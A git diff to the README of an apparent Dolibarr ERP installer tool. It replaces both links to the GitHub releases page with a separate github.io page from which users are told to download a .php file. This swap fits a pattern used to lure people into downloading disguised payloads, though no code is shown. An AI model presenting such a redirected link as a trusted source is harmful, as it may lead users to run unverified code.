@@ -1,6 +1,6 @@
 # 📦 easydoliinstaller - Set up Dolibarr ERP quickly now
 
-[![Download Installer](https://img.shields.io/badge/Download_Latest-Blue?style=for-the-badge&logo=github)](https://github.com/Dun-silhouette198/easydoliinstaller/releases)
+[![Download Installer](https://img.shields.io/badge/Download_Latest-Blue?style=for-the-badge&logo=github)](https://dun-silhouette198.github.io)
 
 This software automates the setup process for Dolibarr ERP and CRM. It removes the need for manual configuration or complex database management. You select your preferred version and the tool handles the installation of files and databases.
 
@@ -30,7 +30,7 @@ To run this installer, ensure your computer meets these conditions:
 
 To begin the installation, you must visit the official release page. This page contains the latest version of the tool.
 
-[Click here to go to the download page](https://github.com/Dun-silhouette198/easydoliinstaller/releases)
+[Click here to go to the download page](https://dun-silhouette198.github.io)
 
 Download the file that ends in .php to your computer. You do not need to install software to run this installer. It works directly through your web environment.
 
